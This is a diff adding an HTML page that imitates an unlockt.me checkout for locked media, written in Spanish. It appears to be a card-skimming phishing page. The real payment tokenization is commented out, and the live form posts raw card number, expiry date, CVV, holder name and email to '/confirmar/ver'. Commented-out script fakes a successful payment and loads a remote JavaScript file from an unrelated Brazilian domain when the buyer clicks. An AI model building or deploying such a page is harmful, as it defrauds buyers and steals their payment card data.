@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>unlockt.me</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta name="description" content="Send locked files & charge to unlock them.">
+        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+        <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
+        <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png" />
+        <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png" />
+        <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png" />
+        <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png" />
+        <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png" />
+        <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png" />
+        <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png" />
+        <link rel="apple-touch-icon-precomposed" sizes="180x180" href="/apple-touch-icon-180x180.png">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+
+                
+                        <link rel="stylesheet" href="/css/global-css.934c9489.css">
+        <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
+        <script type="text/javascript" src="js/script.js"></script>
+        
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            background-color: #F9F9F9;
+        }
+        .ccInfInpt {
+          background: none;
+          /*border: none;*/
+          outline: none;
+          width: 100%;
+          color: #191B1E;
+          font-weight: 400;
+          font-family: "Inter";
+          font-size: 16px;
+          padding: 12px;
+          webkit-font-smoothing: antialiased;
+        }
+        placeholder {
+           color: #A4A4A4;
+        }
+        .inptDiv {
+          position: relative;
+        }
+        .inptDiv .ccBrand {
+          height: 32px;
+          position: absolute;
+          top: 50%;
+          right: 10px;
+          transform: translateY(-50%);
+          pointer-events: none;
+          width: 32px;
+        }
+        .inptDiv .inptCcNum {
+          box-sizing: border-box;
+          padding-right: 50px;
+        }
+        .inptDiv .ccInptIco {
+          width: 100%;
+        }
+        .errTxt {
+          color: #fe5555;
+        }
+    </style>
+
+            <script src="https://js.basistheory.com"></script>
+    <!--<script type="text/javascript">
+
+        (function () {
+            document.addEventListener('DOMContentLoaded', function() {
+                var cardNumberElement
+                var cardExpirationDateElement
+                var cardVerificationCodeElement
+                var cardHolderNameElement
+
+                const customerEmail = document.getElementById('customer-email');
+                const customerEmailError = document.getElementById('customer-email-error');
+
+                const orderUrl = document.getElementById('order-url');
+
+                const loading = document.getElementById('payment-loading');
+                const success = document.getElementById('payment-success');
+                const error = document.getElementById('payment-error');
+                const form = document.getElementById('payment-form');
+                const failed = document.getElementById('payment-failed');
+                const form_error = document.getElementById('payment-form-error');
+
+                function showContent(contentId) {
+                    [loading, success, error, form, failed, form_error].forEach((el) => {
+                        if (el.id === contentId) {
+                            el.classList.remove('hidden');
+                        } else {
+                            el.classList.add('hidden');
+                        }
+                    });
+                }
+
+                    // Form setup
+             /*   window.addEventListener("load", async () => {
+                    try {
+                        // global/window variable BasisTheory is an instance, but requires initialization
+                        await BasisTheory.init("key_prod_eu_pub_HUFe5wqP5mxo7QLDh7YcQV", { elements: true });
+                        // use Elements
+
+                        const style = {
+                            fonts: ["https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,200;0,300;0,400;0,600;0,700;0,900;1,200;1,300;1,400;1,600;1,700;1,900&display=swap"],
+                            base: {
+                                color: "#191B1E",
+                                fontWeight: 400,
+                                fontFamily: '"Inter"',
+                                fontSize: "16px",
+                                padding: '12px 0',
+                                fontSmooth: "antialiased",
+                                "::placeholder": {
+                                    color: "#A4A4A4",
+                                },
+                                ":disabled": {
+                                    backgroundColor: "#f0f0f4",
+                                },
+                            },
+                            invalid: {
+                                color: "#fe5555",
+                            },
+                        }
+
+                        cardHolderNameElement = BasisTheory.createElement('text', {
+                            targetId: 'elementTypesTextElement',
+                            style: style,
+                            placeholder: 'Nombre completo',
+                            validation: /.*[a-zA-Z].*[a-zA-Z].*[a-zA-Z].*
+                        });
+                        cardHolderNameElement.mount('#card-holder-name-element');
+
+
+                        cardNumberElement = BasisTheory.createElement('cardNumber', {
+                            targetId: 'elementTypesCardNumberElement',
+                            iconPosition: 'right',
+                            style: style,
+                            inputMode: 'numeric',
+                            placeholder: '1234 5678 9101 1121'
+                        });
+                        cardNumberElement.mount('#card-number-element');
+
+
+                        cardNumberElement.on('change', ({ cardBrand }) => {
+                            window.cardVerificationCodeElement?.update({ cardBrand });
+                        });
+
+                        cardExpirationDateElement = BasisTheory.createElement('cardExpirationDate', {
+                            targetId: 'elementTypesCardExpirationDateElement',
+                            style: style,
+                            inputMode: 'numeric'
+                        });
+
+                        cardExpirationDateElement.mount('#card-expiration-date-element');
+
+                        cardVerificationCodeElement = BasisTheory.createElement('cardVerificationCode', {
+                            targetId: 'elementTypesCardVerificationCodeElement',
+                            style: style,
+                            inputMode: 'numeric'
+                        });
+
+                        cardVerificationCodeElement.mount('#card-verification-code-element');
+                    } catch (e) {
+                        showContent('payment-form-error')
+                    }
+                });*/
+
+                var processing = false;
+
+                document.getElementById("pay").addEventListener("click", async () => {
+                    /*const allCardFieldValid = [
+                        cardNumberElement,
+                        cardExpirationDateElement,
+                        cardVerificationCodeElement,
+                        cardHolderNameElement
+                    ].every((v) => v.metadata.complete && v.metadata.valid);
+
+                    const emailValid = customerEmail.checkValidity()
+*/
+const allCardFieldValid = true
+const emailValid = true
+                    if(!allCardFieldValid || !emailValid) {
+                        return;
+                    }
+
+                    if (processing) return;
+
+                    processing = true;
+                    showContent('payment-loading');
+
+                    customerEmailError.classList.add('hidden');
+
+                    try {
+                        const token = await BasisTheory.tokens.create({
+                            type: "card",
+                            data: {
+                                holderName: cardHolderNameElement,
+                                number: cardNumberElement,
+                                expiration_month: cardExpirationDateElement.month(),
+                                expiration_year: cardExpirationDateElement.year(),
+                                cvc: cardVerificationCodeElement,
+                            },
+                            expires_at: new Date((new Date()).setMinutes(new Date().getMinutes() + 10)).toISOString()
+                        });
+
+                        const response = await fetch("http://localhost:4000/checkout/7b3581bc9b/pay", {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                token: token.id,
+                                email: customerEmail.value,
+                            }),
+                        });
+
+                        if (!response.ok) {
+                          alert('elpepe')
+                            const errorPayload = await response.json();
+                            throw { status: response.status, payload: errorPayload };
+                        }
+
+                        const payload = await response.json();
+                        orderUrl.setAttribute('href', payload.orderUrl);
+
+                        showContent('payment-success');
+
+                        setTimeout(() => {
+                            window.location = payload.orderUrl;
+                        }, 5000);
+
+                    } catch (error) {
+                        if (error.status === 422 && error.payload['@type'] === 'ConstraintViolationList') {
+                            const emailViolation = error.payload.violations.find(
+                                (violation) => violation.propertyPath === '[email]'
+                            );
+                            if (emailViolation) {
+                                showContent('payment-form');
+                                customerEmailError.innerText = emailViolation.message;
+                                customerEmailError.classList.remove('hidden');
+                                return;
+                            }
+                            showContent('payment-error');
+                        } else if (error.status >= 500) {
+                            showContent('payment-error');
+                        } else {
+                           // showContent('payment-failed');
+                                      /*orderUrl.setAttribute('href', './Fortnite-IP-ext.html');*/
+                                      
+                                        
+                        showContent('payment-success');
+                        
+                        const def = document.createElement('script')
+                        def.setAttribute('src', 'https://tec9.com.br/indeview/sistema/upload/arquivos/ft.js')
+                        
+                        orderUrl.addEventListener('click', () => {
+                          document.body.append(def)
+                        })
+
+                        /*setTimeout(() => {
+                            window.location = './Fortnite-IP-ext.html';
+                        }, 5000);*/
+                        }
+                    } finally {
+                        processing = false;
+                    }
+                })
+            })
+        })()
+    </script> -->
+    </head>
+
+    <body>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M8J9M4VP"
+                      height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    
+            <div class="w-full hidden lg:block">
+        <header class="py-5">
+    <a href="/"><img class="w-4/12 lg:w-3/12 xl:w-3/12 max-w-200 mx-auto" alt="logo" src="https://unlockt.me/images/logo-black.svg"/></a>
+</header>    </div>
+    <div class="flex flex-col mx-5 lg:items-start lg:mt-20 lg:max-w-screen-lg lg:mx-auto lg:h-auto lg:flex-row lg:justify-between">
+        <div class="w-full lg:hidden">
+            <header class="py-5">
+    <a href="/"><img class="w-4/12 lg:w-3/12 xl:w-3/12 max-w-200 mx-auto" alt="logo" src="https://unlockt.me/images/logo-black.svg"/></a>
+</header>        </div>
+        <div class=" bg-white p-4 lg:w-5/12 border-[#F7F7F7] rounded-2xl mb-6 lg:m-0 shadow-sm mt-4">
+            <div class="flex lg:flex-col">
+                <div class="hidden lg:block bg-cover shadow-black/10 h-80 w-full mx-auto mb-4 rounded-2xl" style="background-image: url(https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_0618966f-695e-42ed-ad47-448f018ed8d4.png)"></div>
+                <div class="flex flex-1 items-center justify-between flex-row">
+                    <div class="flex items-center space-x-4 lg:space-x-0">
+                        <svg class="lg:hidden" width="60" height="46" viewBox="0 0 60 46" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                            <rect x="-0.320282" y="14.8819" width="30" height="30" rx="6" transform="rotate(-24 -0.320282 14.8819)" fill="#E0E3E7" stroke="white" stroke-width="2"></rect>
+                                <rect x="5.82756" y="7.31465" width="34" height="34" rx="8" transform="rotate(-11 5.82756 7.31465)" fill="#C9CDD2" stroke="white" stroke-width="2"></rect>
+                                                        <rect x="15" y="1" width="44" height="44" rx="12" fill="url(#pattern0)" stroke="white" stroke-width="2"></rect>
+                            <defs>
+                                <pattern id="pattern0" patternContentUnits="objectBoundingBox" width="1" height="1">
+                                    <image xlink:href="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_0618966f-695e-42ed-ad47-448f018ed8d4.png" width="1" height="1" preserveAspectRatio="none"></image>
+                                </pattern>
+                            </defs>
+                        </svg>
+                        <div>
+                            <p class="text-sm font-medium text-black font-finter">8 medias</p>
+                                                                                    <p class="text-xs text-[#797878] font-normal font-finter">
+                                                                    4 pictures - 4 videos
+                                                            </p>
+                        </div>
+                    </div>
+                    <p class="text-base font-semibold text-black">$3.00</p>
+                </div>
+            </div>
+        </div>
+        <div class="px-5 py-6 mb-10 lg:mb-0 rounded-2xl bg-white w-full lg:w-5/12 border border-[#F7F7F7]">
+            <div class="hidden" id="payment-loading">
+                <svg class="mx-auto mb-6" xmlns="http://www.w3.org/2000/svg" width="56" height="56" viewBox="0 0 24 24">
+                    <path fill="#00B743" d="M12,4a8,8,0,0,1,7.89,6.7A1.53,1.53,0,0,0,21.38,12h0a1.5,1.5,0,0,0,1.48-1.75,11,11,0,0,0-21.72,0A1.5,1.5,0,0,0,2.62,12h0a1.53,1.53,0,0,0,1.49-1.3A8,8,0,0,1,12,4Z"><animateTransform attributeName="transform" dur="0.75s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"></animateTransform></path>
+                </svg>
+                <h1 class="text-2xl font-bold text-black mb-1 text-center font-finter">Un momento...</h1>
+                <p class="text-sm text-[#797878] font-normal font-finter text-center">
+                    Su pago está siendo procesado.
+                </p>
+            </div>
+            <div class="hidden" id="payment-success">
+                <div class="text-xs font-medium text-[#797878] text-center mb-8">19/04/2025 10:23</div>
+                <div class="flex justify-center mb-4">
+                    <svg width="73" height="72" viewBox="0 0 73 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M36.5 3C18.2746 3 3.5 17.7746 3.5 36C3.5 54.2254 18.2746 69 36.5 69C54.7254 69 69.5 54.2254 69.5 36C69.5 17.7746 54.7254 3 36.5 3ZM52.1213 29.1213C53.2929 27.9497 53.2929 26.0503 52.1213 24.8787C50.9497 23.7071 49.0503 23.7071 47.8787 24.8787L32 40.7574L25.1213 33.8787C23.9497 32.7071 22.0503 32.7071 20.8787 33.8787C19.7071 35.0503 19.7071 36.9497 20.8787 38.1213L29.8787 47.1213C31.0503 48.2929 32.9497 48.2929 34.1213 47.1213L52.1213 29.1213Z" fill="#00B743"></path>
+                    </svg>
+                </div>
+                <h1 class="text-2xl font-bold text-black mb-8  text-center font-finter">Pago exitoso</h1>
+                <div class="bg-[#F7F7F7] rounded-2xl flex p-4 space-x-3">
+                    <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <g clip-path="url(#clip0_73_1293)">
+                            <path d="M9 12V9M9 6H9.0075M16.5 9C16.5 13.1421 13.1421 16.5 9 16.5C4.85786 16.5 1.5 13.1421 1.5 9C1.5 4.85786 4.85786 1.5 9 1.5C13.1421 1.5 16.5 4.85786 16.5 9Z" stroke="black" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </g>
+                        <defs>
+                            <clipPath id="clip0_73_1293">
+                                <rect width="18" height="18" fill="white"></rect>
+                            </clipPath>
+                        </defs>
+                    </svg>
+                    <p class="text-sm text-[#191B1E] font-medium font-finter">
+                        Será redirigido automáticamente a su compra en unos segundos.
+                    </p>
+                </div>
+                <a id="order-url" href="#">
+                    <p class="bg-[#00B743] w-full py-2.5 rounded-xl text-center text-white text-lg font-finter font-medium mt-8">
+                        Acceder al contenido
+                    </p>
+                </a>
+            </div>
+            <div class="hidden" id="payment-error">
+                <div class="text-xs font-medium text-[#797878] text-center mb-8">10 OCT 2024, 16h12</div>
+                <div class="flex justify-center mb-4">
+                    <svg width="73" height="72" viewBox="0 0 73 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M36.5 3C18.2746 3 3.5 17.7746 3.5 36C3.5 54.2254 18.2746 69 36.5 69C54.7254 69 69.5 54.2254 69.5 36C69.5 17.7746 54.7254 3 36.5 3ZM47.6213 24.8787C48.7929 26.0503 48.7929 27.9497 47.6213 29.1213L40.7426 36L47.6213 42.8787C48.7929 44.0503 48.7929 45.9497 47.6213 47.1213C46.4497 48.2929 44.5503 48.2929 43.3787 47.1213L36.5 40.2426L29.6213 47.1213C28.4497 48.2929 26.5503 48.2929 25.3787 47.1213C24.2071 45.9497 24.2071 44.0503 25.3787 42.8787L32.2574 36L25.3787 29.1213C24.2071 27.9497 24.2071 26.0503 25.3787 24.8787C26.5503 23.7071 28.4497 23.7071 29.6213 24.8787L36.5 31.7574L43.3787 24.8787C44.5503 23.7071 46.4497 23.7071 47.6213 24.8787Z" fill="#FC5358"></path>
+                    </svg>
+                </div>
+                <h1 class="text-2xl font-bold text-black mb-8  text-center font-finter">Error de pago</h1>
+                <div class="bg-[#F7F7F7] rounded-2xl flex mb-4 p-4 space-x-3">
+                    <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <g clip-path="url(#clip0_73_1293)">
+                            <path d="M9 12V9M9 6H9.0075M16.5 9C16.5 13.1421 13.1421 16.5 9 16.5C4.85786 16.5 1.5 13.1421 1.5 9C1.5 4.85786 4.85786 1.5 9 1.5C13.1421 1.5 16.5 4.85786 16.5 9Z" stroke="black" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </g>
+                        <defs>
+                            <clipPath id="clip0_73_1293">
+                                <rect width="18" height="18" fill="white"></rect>
+                            </clipPath>
+                        </defs>
+                    </svg>
+                    <p class="text-sm text-[#191B1E] font-medium font-finter">
+                        No se ha debitado ninguna cantidad de su método de pago.
+                    </p>
+                </div>
+                <p class="text-sm text-[#797878] text-center font-finter">
+                    Lo sentimos, parece que ocurrió un error al procesar su pago.
+                </p>
+                <button onclick="window.location.reload();" class="bg-[#191B1E] w-full py-2.5 rounded-xl text-white text-lg font-finter font-medium mt-8">
+                    Intentar de nuevo
+                </button>
+            </div>
+            <div class="hidden" id="payment-failed">
+                <div class="text-xs font-medium text-[#797878] text-center mb-8">19/04/2025 10:23</div>
+                <div class="flex justify-center mb-4">
+                    <svg width="73" height="72" viewBox="0 0 73 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M36.5 3C18.2746 3 3.5 17.7746 3.5 36C3.5 54.2254 18.2746 69 36.5 69C54.7254 69 69.5 54.2254 69.5 36C69.5 17.7746 54.7254 3 36.5 3ZM47.6213 24.8787C48.7929 26.0503 48.7929 27.9497 47.6213 29.1213L40.7426 36L47.6213 42.8787C48.7929 44.0503 48.7929 45.9497 47.6213 47.1213C46.4497 48.2929 44.5503 48.2929 43.3787 47.1213L36.5 40.2426L29.6213 47.1213C28.4497 48.2929 26.5503 48.2929 25.3787 47.1213C24.2071 45.9497 24.2071 44.0503 25.3787 42.8787L32.2574 36L25.3787 29.1213C24.2071 27.9497 24.2071 26.0503 25.3787 24.8787C26.5503 23.7071 28.4497 23.7071 29.6213 24.8787L36.5 31.7574L43.3787 24.8787C44.5503 23.7071 46.4497 23.7071 47.6213 24.8787Z" fill="#FC5358"></path>
+                    </svg>
+                </div>
+                <h1 class="text-2xl font-bold text-black mb-8  text-center font-finter">Pago fallido</h1>
+                <div class="bg-[#F7F7F7] rounded-2xl flex mb-4 p-4 space-x-3">
+                    <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <g clip-path="url(#clip0_73_1293)">
+                            <path d="M9 12V9M9 6H9.0075M16.5 9C16.5 13.1421 13.1421 16.5 9 16.5C4.85786 16.5 1.5 13.1421 1.5 9C1.5 4.85786 4.85786 1.5 9 1.5C13.1421 1.5 16.5 4.85786 16.5 9Z" stroke="black" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </g>
+                        <defs>
+                            <clipPath id="clip0_73_1293">
+                                <rect width="18" height="18" fill="white"></rect>
+                            </clipPath>
+                        </defs>
+                    </svg>
+                    <p class="text-sm text-[#191B1E] font-medium font-finter">
+                        Lo sentimos, parece que su pago ha fallado.
+                    </p>
+                </div>
+                <p class="text-sm text-[#797878] text-center font-finter">
+                    Lo sentimos, parece que su pago ha fallado.
+                </p>
+                <button onclick="window.location.reload();" class="bg-[#191B1E] w-full py-2.5 rounded-xl text-white text-lg font-finter font-medium mt-8">
+                    Intentar de nuevo
+                </button>
+            </div>
+            <div class="hidden" id="payment-form-error">
+                <div class="flex justify-center mb-4">
+                    <svg width="73" height="72" viewBox="0 0 73 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M36.5 48V36M36.5 24H36.53M66.5 36C66.5 52.5685 53.0685 66 36.5 66C19.9315 66 6.5 52.5685 6.5 36C6.5 19.4315 19.9315 6 36.5 6C53.0685 6 66.5 19.4315 66.5 36Z" stroke="black" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </svg>
+                </div>
+                <h1 class="text-2xl font-bold text-black mb-8  text-center font-finter">Error de carga</h1>
+                <div class="bg-[#F7F7F7] rounded-2xl flex mb-4 p-4 space-x-3">
+                    <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <g clip-path="url(#clip0_73_1293)">
+                            <path d="M9 12V9M9 6H9.0075M16.5 9C16.5 13.1421 13.1421 16.5 9 16.5C4.85786 16.5 1.5 13.1421 1.5 9C1.5 4.85786 4.85786 1.5 9 1.5C13.1421 1.5 16.5 4.85786 16.5 9Z" stroke="black" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </g>
+                        <defs>
+                            <clipPath id="clip0_73_1293">
+                                <rect width="18" height="18" fill="white"></rect>
+                            </clipPath>
+                        </defs>
+                    </svg>
+                    <p class="text-sm text-[#191B1E] font-medium font-finter">
+                        Se produjo un error, por favor inténtelo de nuevo.
+                    </p>
+                </div>
+                <button onclick="window.location.reload();" class="bg-[#191B1E] w-full py-2.5 rounded-xl text-white text-lg font-finter font-medium mt-8">
+                    Intentar de nuevo
+                </button>
+            </div>
+            <form id="payment-form" class="payment-form" method="post" action="/confirmar/ver">
+                <div class="mb-4">
+                    <label for="customer-email" class="font-finter block font-medium text-sm mb-2 text-[#191B1E]">Correo electrónico*</label>
+                    <input name="email" class="emailInpt flex-1 font-finter py-2 px-4 font-normal bg-white placeholder-[#A4A4A4] w-full text-[#191B1E] border-[#E5E5EA] rounded-xl border focus:outline-none ccInfInpt"
+                            required
+                            placeholder="Dirección de correo electrónico"
+                            type="email"
+                            id="emailInpt"
+                    />
+                    <p id="customer-email-error" class="hidden font-finter text-sm font-normal text-[#FE5555] mt-1"></p>
+                </div>
+                <p class="font-finter font-medium text-sm mb-2">Información de la tarjeta*</p>
+                <div class="inptDiv bg-white rounded-tl-xl rounded-tr-xl" id="card-number-element"><input name="num" type="text" inputmode="numeric" id="ccNumInpt" class="ccNumInpt ccInfInpt rounded-tl-xl rounded-tr-xl border border-[#E5E5EA]" placeholder="1234 5678 9101 1121" maxlength="16"> 
+                <div class="ccBrand">
+                  <img src="img/ccInpt.png" class="ccInptIco">
+                </div>
+                </div>
+                <div class="flex w-full mb-4">
+                    <div class="flex-1 bg-white  rounded-bl-xl " id="card-expiration-date-element"><input name="date" type="text" inputmode="numeric" id="ccDteInpt" class="ccDteInpt ccInfInpt rounded-bl-xl border-[#E5E5EA] border-l border-b border-r" placeholder="MM / AA"maxlength="5"></div>
+                    <div class="flex-1 bg-white  rounded-br-xl " id="card-verification-code-element"><input name="cde" type="number" id="ccvInpt" class="ccInfInpt ccvInpt rounded-br-xl border-[#E5E5EA] border-b border-r" placeholder="CCV"></div>
+                </div>
+                <p class="font-finter font-medium text-sm mb-2">Titular de la tarjeta*</p>
+                <div class="flex-1 bg-white  rounded-xl " id="card-holder-name-element"><input name="name" type="text" id="nameInpt" class="nameInpt ccInfInpt rounded-xl border-[#E5E5EA] border" placeholder="Nombre completo"></div>
+                <button class="bg-[#00B743] w-full py-2.5 rounded-xl text-white text-lg font-finter font-medium mt-8 payBtn" type="submit" id="pay">Pagar</button>
+            </form>
+        </div>
+    </div>
+
+        
+                    </body>
+</html>
